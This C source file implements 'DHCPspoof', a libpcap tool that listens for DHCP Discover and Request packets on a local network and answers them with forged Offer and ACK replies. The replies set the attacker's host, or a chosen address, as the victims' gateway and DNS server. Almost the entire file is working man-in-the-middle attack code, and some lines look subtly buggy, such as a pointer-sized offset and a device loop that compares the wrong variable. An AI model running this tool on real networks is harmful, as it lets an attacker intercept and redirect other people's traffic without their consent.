/*
 * ----------------------------------------------------------------------------
 * DHCPspoof - A tool to perform DHCP spoofing
 * ----------------------------------------------------------------------------
 *
 * Copyright (C) 2017 - Emanuele Faranda
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 3 of the License, or
 * (at your option) any later version.
 * 
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 * 
 * You should have received a copy of the GNU General Public License
 * along with this program; if not, write to the Free Software
 * Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston,
 * MA 02110-1301, USA.
 * 
 */

#include <stdio.h>
#include <stdlib.h>
#include <libgen.h>
#include <ctype.h>
#include <unistd.h>
#include <string.h>
#include <pcap.h>
#include <errno.h>
#include <signal.h>
#include <arpa/inet.h>
#include <sys/ioctl.h>
#include <linux/if.h>
#include <arpa/inet.h>

#include "utilities.h"

struct config {
  /* Options */
  char *gateway;
  char *dns_server;
  char *ifname;
  int show_help;
  u_int32_t dhcp_lease_time_secs;
  u_int32_t dhcp_renewal_time_secs;
  u_int32_t dhcp_rebind_time_secs;
  u_int8_t min_pool_ip;
  u_int8_t max_pool_ip;

  /* Runtime status */
  int running;
  pcap_t *pcap_handle;
  int pcap_datalink_type;
  u_int8_t mac_address[6];
  u_int32_t ip_address;
  u_int32_t subnet_mask;
  u_int32_t broadcast_address;
  u_int32_t dns_address;
  u_int32_t router;
  u_int eth_offset;
  u_int ip_offset;
  u_int ip_pool_ctr;
};

static struct config cfg = {0};

struct dhcp_boot_request {
  u_int8_t request_type;
  const u_char *host_name_ptr;
  const u_char *cli_id_ptr;
  u_int32_t server_identifier;
  u_int32_t requested_ip;
  u_int host_name_len;
};

static void usage(char **argv) {
  printf("Usage: %s [options] interface\n"
    " -g gateway\tthe spoofed gateway. Default: this host.\n"
    " -d dns\t\tthe spoofed DNS server. Default: this host.\n"
    , basename(argv[0]));
}

static int read_options(int argc, char **argv) {
  int c, i;
  struct in_addr in;
  
  while ((c = getopt(argc, argv, "g:d:h")) != -1) {
    switch (c) {
      case 'g':
        if (inet_aton(optarg, &in) == 0) {
          fprintf(stderr, "Invalid IPv4 argument '%s'\n", optarg);
          return 1;
        }

        cfg.gateway = optarg;
        cfg.router = ntohl(in.s_addr);
        break;
      case 'd':
        if (inet_aton(optarg, &in) == 0) {
          fprintf(stderr, "Invalid IPv4 argument '%s'\n", optarg);
          return 1;
        }

        cfg.dns_server = optarg;
        cfg.dns_address = ntohl(in.s_addr);
        break;
      case 'h':
        cfg.show_help = 1;
        break;
      case '?':
        fprintf(stderr, "Bad option %c\n", optopt);
        return 1;
      default:
        return 1;
      }
  }

  /* Positional parameters */
  for (i = optind; i < argc; i++) {
    cfg.ifname = strdup(argv[i]);
    break;
  }

  if (cfg.ifname == NULL) { fprintf(stderr, "The network interface parameter is missing\n"); return 1; }
  
  return 0;
}

static void signals_handler(int signo) {
  if (cfg.running) {
    fprintf(stderr, "\nTerminating...\n");
    cfg.running = 0;
    pcap_breakloop(cfg.pcap_handle);
  } else {
    fprintf(stderr, "\nOk, I'm leaving now!\n");
    exit(1);
  }
}

static int setup_signal_handlers() {
  struct sigaction sa;

  memset(&sa, 0, sizeof(sa));
  sa.sa_handler = signals_handler;
  sigemptyset(&sa.sa_mask);
  sigaddset(&sa.sa_mask, SIGINT);
  sigaddset(&sa.sa_mask, SIGTERM);
  sigaddset(&sa.sa_mask, SIGHUP);

  if (sigaction(SIGINT, &sa, NULL) < 0) {
    fprintf(stderr, "sigaction(SIGINT) failure: %s\n", strerror(errno));
    return 1;
  }
  if (sigaction(SIGTERM, &sa, NULL) < 0) {
    fprintf(stderr, "sigaction(SIGTERM) failure: %s\n", strerror(errno));
    return 1;
  }
  if (sigaction(SIGHUP, &sa, NULL) < 0) {
    fprintf(stderr, "sigaction(SIGHUP) failure: %s\n", strerror(errno));
    return 1;
  }

  return 0;
}

static int read_pcap_device_info(char *pcap_error_buffer) {
  pcap_if_t *devpointer, *device;
  int found = 0;

  if(pcap_findalldevs(&devpointer, pcap_error_buffer) < 0) {
    fprintf(stderr, "pcap_findalldevs error: %s", pcap_geterr(cfg.pcap_handle));
    return 1;
  }

  device = devpointer;

  while ((device != NULL) && !found) {
    if (strcmp(devpointer->name, cfg.ifname) == 0) {
      struct pcap_addr *address = devpointer->addresses;

      while (address != NULL) {
        if (address->addr->sa_family == AF_INET) {
          cfg.ip_address = ntohl(((struct sockaddr_in *) address->addr)->sin_addr.s_addr);
          cfg.subnet_mask = ntohl(((struct sockaddr_in *) address->netmask)->sin_addr.s_addr);
          cfg.broadcast_address = cfg.subnet_mask | ntohl(((struct sockaddr_in *) address->broadaddr)->sin_addr.s_addr);
          found = 1;
          break;
        }
        address = address->next;
      }
    }
    device = device->next;
  }

  pcap_freealldevs(devpointer);

  if (! found) {
    fprintf(stderr, "Unable to read interface %s IPv4 address", cfg.ifname);
    return 1;
  }

  return 0;
}

static int initialize() {
  char pcap_error_buffer[PCAP_ERRBUF_SIZE];
  char nil_mac[6] = {0};

  cfg.pcap_handle = pcap_open_live(cfg.ifname, SNAPLEN, 1 /* promiscuous mode */,
    READ_TIMEOUT_MS, pcap_error_buffer);

  if (cfg.pcap_handle == NULL) {
    fprintf(stderr, "Cannot open device %s\n", pcap_error_buffer);
    return 1;
  }
  cfg.pcap_datalink_type = pcap_datalink(cfg.pcap_handle);

  switch(cfg.pcap_datalink_type) {
    case DLT_EN10MB:
      cfg.eth_offset = 0;
      cfg.ip_offset = sizeof(struct ndpi_ethhdr) + cfg.eth_offset;
      break;
    default:
      fprintf(stderr, "Unsupported datalink type %d\n", cfg.pcap_datalink_type);
      pcap_close(cfg.pcap_handle);
      return 1;
  }

  /* Determine the IP, subnet_mask and broacast */
  if (read_pcap_device_info(pcap_error_buffer) != 0) {
    pcap_close(cfg.pcap_handle);
    return 1;
  }

  /* Determine the MAC address */
  read_mac(cfg.ifname, cfg.mac_address);
  if (memcmp(cfg.mac_address, nil_mac, 6) == 0) {
    fprintf(stderr, "Cannot determine interface %s MAC address\n", cfg.ifname);
    pcap_close(cfg.pcap_handle);
    return 1;
  }

  char mac[MAC_ADDRESS_STR_SIZE];
  u_int32_t netip = htonl(cfg.ip_address);
  char ipv4[16];

  printf("Interface %s: ip='%s', mac='%s'\n", cfg.ifname,
    inet_ntop(AF_INET, &netip, ipv4, sizeof(ipv4)),
    format_mac(cfg.mac_address, mac, sizeof(mac)));

  cfg.ip_pool_ctr = cfg.min_pool_ip;
  cfg.running = 1;

  if (setup_signal_handlers() != 0)
    return 1;

  return 0;
}

static int finalize() {
  pcap_close(cfg.pcap_handle);

  return 0;
}

static u_int32_t reserve_ip_address() {
  u_int32_t ip = (cfg.ip_address & cfg.subnet_mask) + cfg.ip_pool_ctr;

  /* TODO make configurable */
  if (cfg.ip_pool_ctr == cfg.max_pool_ip)
    cfg.ip_pool_ctr = cfg.min_pool_ip;
  else
    cfg.ip_pool_ctr++;

  return ip;
}

/* NOTE: this should be greater than the maximum DHCP options offset used */
#define SPOOFED_DHCP_OPTIONS_SIZE 64

#define SPOOFED_DHCP_REPLY_SIZE (sizeof(struct ndpi_ethhdr)\
  + sizeof(struct ndpi_iphdr)\
  + sizeof(struct ndpi_udphdr)\
  + sizeof(struct dhcp_packet_t) - DHCP_VEND_LEN + SPOOFED_DHCP_OPTIONS_SIZE /* Actually used DNS options */)

static int spoofDHCPReply(const struct dhcp_packet_t *dhcp_request, const u_char *cli_mac, u_int32_t offered_address, u_int8_t msg_type) {
  u_char pkt[SPOOFED_DHCP_REPLY_SIZE] = {0};
  u_int32_t buf;

  struct ndpi_ethhdr *ethernet = (struct ndpi_ethhdr *)&pkt[0];
  memcpy(ethernet->h_dest, cli_mac, 6);
  memcpy(ethernet->h_source, cfg.mac_address, 6);
  ethernet->h_proto = htons(ETHERTYPE_IP);

  struct ndpi_iphdr *ip = (struct ndpi_iphdr *)&pkt[sizeof(struct ndpi_ethhdr)];
  ip->version = 4;
  ip->ihl = 5;
  ip->tos = 0xc0;
  ip->id = 0xbeef;
  ip->ttl = 64;
  ip->protocol = IPPROTO_UDP;
  ip->saddr = htonl(cfg.ip_address);
  ip->daddr = htonl(offered_address);

  struct ndpi_udphdr *udp = (struct ndpi_udphdr *)&pkt[sizeof(struct ndpi_ethhdr) + sizeof(struct ndpi_iphdr)];
  udp->source = htons(67);
  udp->dest = htons(68);

  struct dhcp_packet_t *dhcp = (struct dhcp_packet_t *)&pkt[sizeof(struct ndpi_ethhdr) + sizeof(struct ndpi_iphdr) + sizeof(struct ndpi_udphdr *)];
  dhcp->msgType = DHCP_MSGTYPE_BOOT_REPLY;
  dhcp->htype = DHCP_OPTION_HARDWARE_TYPE_ETHERNET;
  dhcp->hlen = 6;
  dhcp->xid = dhcp_request->xid;
  dhcp->yiaddr = htonl(offered_address);
  dhcp->siaddr = htonl(cfg.ip_address);
  memcpy(dhcp->chaddr, dhcp_request->chaddr, DHCP_CHADDR_LEN);
  dhcp->magic = htonl(DHCP_OPTION_MAGIC_NUMBER);

  dhcp->options[0] = DHCP_OPTION_MESSAGE_TYPE;
  dhcp->options[1] = 1;
  dhcp->options[2] = msg_type;

  dhcp->options[2+1] = DHCP_OPTION_DHCP_SERVER_IDENTIFIER;
  dhcp->options[4] = 4;
  buf = htonl(cfg.ip_address), memcpy(&dhcp->options[5], &buf, 4);

  dhcp->options[5+4] = DHCP_OPTION_LEASE_TIME;
  dhcp->options[10] = 4;
  buf = htonl(cfg.dhcp_lease_time_secs), memcpy(&dhcp->options[11], &buf, 4);

  dhcp->options[11+4] = DHCP_OPTION_RENEWAL_TIME;
  dhcp->options[16] = 4;
  buf = htonl(cfg.dhcp_renewal_time_secs), memcpy(&dhcp->options[17], &buf, 4);

  dhcp->options[17+4] = DHCP_OPTION_REBINDING_TIME;
  dhcp->options[22] = 4;
  buf = htonl(cfg.dhcp_rebind_time_secs), memcpy(&dhcp->options[23], &buf, 4);

  dhcp->options[23+4] = DHCP_OPTION_SUBNET_MASK;
  dhcp->options[28] = 4;
  buf = htonl(cfg.subnet_mask), memcpy(&dhcp->options[29], &buf, 4);

  dhcp->options[29+4] = DHCP_OPTION_BROADCAST_ADDRESS;
  dhcp->options[34] = 4;
  dhcp->options[35] = htonl(cfg.broadcast_address);
  buf = htonl(cfg.broadcast_address), memcpy(&dhcp->options[35], &buf, 4);

  dhcp->options[35+4] = DHCP_OPTION_DNS_SERVER;
  dhcp->options[40] = 4;
  buf = htonl(cfg.dns_address), memcpy(&dhcp->options[41], &buf, 4);

  dhcp->options[41+4] = DHCP_OPTION_ROUTER;
  dhcp->options[46] = 4;
  buf = htonl(cfg.router), memcpy(&dhcp->options[47], &buf, 4);

  dhcp->options[47+4] = DHCP_OPTION_END;

  /* Lengths */
  u_int16_t dhcp_len = sizeof(struct dhcp_packet_t) - DHCP_VEND_LEN + SPOOFED_DHCP_OPTIONS_SIZE;
  u_int16_t udp_len = sizeof(struct ndpi_udphdr) + dhcp_len;
  udp->len = htons(udp_len);
  ip->tot_len = htons(sizeof(struct ndpi_iphdr) + udp_len);

  /* Checksums */
  ip->check = 0;
  ip->check = wrapsum(in_cksum((unsigned char *)ip, sizeof(struct ndpi_iphdr), 0));
  udp->check = 0;
  udp->check = wrapsum(
    in_cksum((unsigned char *)udp, sizeof(struct ndpi_udphdr),
      in_cksum((unsigned char *)dhcp, dhcp_len,
        in_cksum((unsigned char *)&ip->saddr, sizeof(ip->saddr),
          in_cksum((unsigned char *)&ip->daddr, sizeof(ip->daddr),
            IPPROTO_UDP + ntohs(udp->len))))));

  /* Send the packet */
  if (pcap_sendpacket(cfg.pcap_handle, pkt, sizeof(pkt)) != 0) {
    fprintf(stderr,"Error sending spoofed DHCP reply packet: %s\n", pcap_geterr(cfg.pcap_handle));
    return 1;
  }

  return 0;
}

static int spoofDHCPOffer(const struct dhcp_packet_t *dhcp_request, const u_char *cli_mac, u_int32_t offered_address) {
  return spoofDHCPReply(dhcp_request, cli_mac, offered_address, DHCP_OPTION_MESSAGE_TYPE_OFFER);
}

static int spoofDHCPAcknoledgement(const struct dhcp_packet_t *dhcp_request, const u_char *cli_mac, u_int32_t offered_address) {
  return spoofDHCPReply(dhcp_request, cli_mac, offered_address, DHCP_OPTION_MESSAGE_TYPE_ACK);
}

static int packetLoop() {
  int rc;
  const u_char *packet;
  struct pcap_pkthdr * h;

  printf("Capturing packets on interface %s\n", cfg.ifname);

  while(cfg.running) {
    rc = pcap_next_ex(cfg.pcap_handle, &h, &packet);

    if(rc == 1) {
      const struct ndpi_ethhdr *ethernet = (struct ndpi_ethhdr *)&packet[cfg.eth_offset];
      const int ip_offset = cfg.ip_offset;
      const int eth_type = ntohs(ethernet->h_proto);
      const struct ndpi_iphdr *iph = (struct ndpi_iphdr *) &packet[ip_offset];

      if(eth_type == ETHERTYPE_IP) {
        if((h->caplen >= ip_offset)
         && (iph->version == 4)
         && (iph->protocol == IPPROTO_UDP)) {
          u_short ip_len = ((u_short)iph->ihl * 4);
          const int udp_offset = ip_offset + ip_len;
          struct ndpi_udphdr *udp = (struct ndpi_udphdr *)&packet[udp_offset];
          u_int16_t sport = ntohs(udp->source), dport = ntohs(udp->dest);

          if((sport == 68) && (dport == 67) && (iph->saddr == 0) && (udp->len >= sizeof(struct dhcp_packet_t))) {
            struct dhcp_packet_t *dhcp = (struct dhcp_packet_t *)&packet[udp_offset + sizeof(struct ndpi_udphdr)];

            if((dhcp->magic == htonl(DHCP_OPTION_MAGIC_NUMBER))
             && (dhcp->hlen == 6)
             && (dhcp->msgType == DHCP_MSGTYPE_BOOT_REQUEST)) {
              struct dhcp_boot_request request = {0};
              int i = 0;

              while(i < DHCP_VEND_LEN) {
                u_int8_t opt = dhcp->options[i];
                u_int8_t optlen = dhcp->options[i+1];
                const u_char *optval = &dhcp->options[i+2];

                if (opt == DHCP_OPTION_MESSAGE_TYPE) {
                  request.request_type = *optval;
                } else if (opt == DHCP_OPTION_HOST_NAME) {
                  request.host_name_ptr = optval;
                  request.host_name_len = optlen;
                } else if ((opt == DHCP_OPTION_CLIENT_ID)
                 && (optlen == 7)
                 && (*optval == DHCP_OPTION_HARDWARE_TYPE_ETHERNET)) {
                  request.cli_id_ptr = &optval[1];
                } else if ((opt == DHCP_OPTION_DHCP_SERVER_IDENTIFIER) && (optlen == 4)) {
                  request.server_identifier = ntohl(*((u_int32_t *)optval));
                } else if ((opt == DHCP_OPTION_REQUESTED_IP) && (optlen == 4)) {
                  request.requested_ip = ntohl(*((u_int32_t *)optval));;
                } else if (opt == DHCP_OPTION_END)
                  break;

                i += optlen + 2;
              }

              char hostname[64] = {0};
              char srcmac[MAC_ADDRESS_STR_SIZE];
              char ipv4[16];
              if(request.host_name_ptr != NULL)
                  strncpy(hostname, (char*)request.host_name_ptr, min(sizeof(hostname)-1, request.host_name_len));

              if ((request.request_type == DHCP_OPTION_MESSAGE_TYPE_DISCOVER)
                      && (request.cli_id_ptr != NULL)) {
                u_int32_t offered_ip = reserve_ip_address();
                u_int32_t netip = htonl(offered_ip);

                printf("(%x) DHCP Offer %s -> cli_mac='%s', hostname='%s'\n", ntohl(dhcp->xid),
                  inet_ntop(AF_INET, &netip, ipv4, sizeof(ipv4)),
                  format_mac(request.cli_id_ptr, srcmac, sizeof(srcmac)),
                  hostname);

                spoofDHCPOffer(dhcp, request.cli_id_ptr, offered_ip);
              } else if ((request.request_type == DHCP_OPTION_MESSAGE_TYPE_REQUEST)
                      && ((((request.server_identifier == 0) || (request.server_identifier == cfg.ip_address)) /* The message is a broadcast directed to us */
                         && (request.requested_ip != 0))
                       || ((iph->saddr != 0) && (ntohl(iph->daddr) == cfg.ip_address)))) {                     /* The message is a unicast directed to us */
                u_int32_t netip = (request.requested_ip != 0) ? htonl(request.requested_ip) : iph->saddr;

                printf("(%x) DHCP ACK %s -> cli_mac='%s', hostname='%s'\n", ntohl(dhcp->xid),
                  inet_ntop(AF_INET, &netip, ipv4, sizeof(ipv4)),
                  format_mac(request.cli_id_ptr, srcmac, sizeof(srcmac)),
                  hostname);

                /* Handle both:
                 * - the post-discovery response
                 * - the lease renew (not working since it's a unicast to port 67 of this host, which is closed
                 *   since we are not listening on a socket). */
                spoofDHCPAcknoledgement(dhcp, request.cli_id_ptr, (request.requested_ip != 0) ? request.requested_ip : iph->saddr);
              }
            }
          }
        }
      }
    } else if (rc == -1) {
      pcap_perror(cfg.pcap_handle, "Error while reading the packet");
    }
  }

  return 0;
}

int main(int argc, char **argv) {
  int rv;

  /* Default options - see http://www.tcpipguide.com/free/t_DHCPGeneralOperationandClientFiniteStateMachine.htm for state machine */
  cfg.dhcp_lease_time_secs = 86400;   // 1 day
  cfg.dhcp_renewal_time_secs = 43200; // 12 hours
  cfg.dhcp_rebind_time_secs = 50400;  // 14 hours

  cfg.min_pool_ip = 200;
  cfg.max_pool_ip = 254;

  if ((read_options(argc, argv) != 0) || (cfg.show_help)) {
    usage(argv);
    return 1;
  }

  if (initialize() != 0)
    return 1;

  /* Default options - post init */
  if(cfg.router == 0) cfg.router = cfg.ip_address;
  if(cfg.dns_address == 0) cfg.dns_address = cfg.ip_address;

  /* Main loop */
  rv = packetLoop();

  if (finalize() != 0)
    return 1;

  return rv;
}
